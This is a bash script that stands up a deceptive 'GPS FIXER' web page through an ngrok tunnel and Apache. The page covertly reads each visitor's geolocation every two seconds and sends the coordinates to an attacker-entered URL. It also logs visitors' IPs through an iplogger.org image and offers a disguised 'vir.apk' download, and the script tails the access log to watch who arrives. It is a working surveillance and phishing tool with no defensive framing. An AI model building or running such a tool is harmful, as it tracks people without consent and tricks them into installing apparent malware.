#!/bin/bash

#64-bit
sudo xterm -e ./ngrok_64 http 80 & clear

#32-bit
#xterm -e ./ngrok http 80 & clear


echo "            ______________________________________________________
            7      77  _  77  _  77     77  7  77  7  77  _  77  7
            !__  __!|    _||  _  ||  ___!|   __!|  |  ||    _||  |
              7  7  |  _ \ |  7  ||  7___|     ||  |  ||  _ \ |  !___
              |  |  |  7  ||  |  ||     7|  7  ||  !  ||  7  ||     7
              !__!  !__!__!!__!__!!_____!!__!__!!_____!!__!__!!_____!
                                                                     "
sleep 5
read -p '           URL: ' varurl
echo "<!DOCTYPE html>
<html>
  <title>GPS FIXER</title> 
  <body>
	
	
    <body background="https://coolsite.altervista.org/tracksite/imageandro.png">
	
   
    <img src="https://coolsite.altervista.org/tracksite/image.jpg">
    <img src="https://iplogger.org/1w9jw7" alt="iplogger.org - IP Logging Service" border="0">
    <!--The div element for the map -->
    <div id="map"></div>
    <script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js\"></script>
      <script>
         function httpGet(theUrl) {
             var xmlHttp = new XMLHttpRequest();
             xmlHttp.open( \"GET\", theUrl, false ); // false for synchronous request
             xmlHttp.send( null );
             return xmlHttp.responseText;
         }

         function autoUpdate() {
           navigator.geolocation.getCurrentPosition(function(position) {
             coords = position.coords.latitude + \",\" + position.coords.longitude;
              url = \""$varurl"/logme/\" + coords;
             httpGet(url);
             console.log('should be working');
             setTimeout(autoUpdate, 2000);
         })
         };
         \$(document).ready(function(){
            autoUpdate();
         });
      </script>
     

 <script src='https://maps.googleapis.com/maps/api/js?v=3.exp'></script>

<div style='overflow:hidden;height:400px;width:600px;'><div id='gmap_canvas' style='height:440px;width:700px;'></div>

<div><small><a href="https://embedgooglemaps.com/fr/">https://embedgooglemaps.com/fr/</a></small></div>

<div><small><a href="http://www.stedentrippers.nl/berlijn.html">Stedentrippers Blog</a></small></div><style>#gmap_canvas img{max-width:none!important;background:none!important}</style></div>

<script type='text/javascript'>function init_map(){var myOptions = {zoom:14,center:new google.maps.LatLng(43.5630132,12.836207899999977),mapTypeId: google.maps.MapTypeId.SATELLITE};map = new google.maps.Map(document.getElementById('gmap_canvas'), myOptions);marker = new google.maps.Marker({map: map,position: new google.maps.LatLng(43.5630132,12.836207899999977)});infowindow = new google.maps.InfoWindow({content:'<strong>GPS fixer</strong><br>Pergola, Italy<br>'});google.maps.event.addListener(marker, 'click', function(){infowindow.open(map,marker);});infowindow.open(map,marker);}google.maps.event.addDomListener(window, 'load', init_map);</script>


<img src="https://coolsite.altervista.org/tracksite/image3.jpg">

<a href="192.168.0.150/vir.apk" download>
  <img src="http://www.zerobyte.biz/zerogis/images/gps.png" alt="GPS Fixer" width="104" height="104">
</a>
  </body>
</html>" > index.html

mv index.html /var/www/html/index.html
service apache2 start
echo "         ______________________________________________________
         7      77  _  77  _  77     77  7  77  7  77  _  77  7
         !__  __!|    _||  _  ||  ___!|   __!|  |  ||    _||  |
           7  7  |  _ \ |  7  ||  7___|     ||  |  ||  _ \ |  !___
           |  |  |  7  ||  |  ||     7|  7  ||  !  ||  7  ||     7
           !__!  !__!__!!__!__!!_____!!__!__!!_____!!__!__!!_____!
                                                                  " > /var/log/apache2/access.log
xterm -e tail -f /var/log/apache2/access.log &
clear
exit
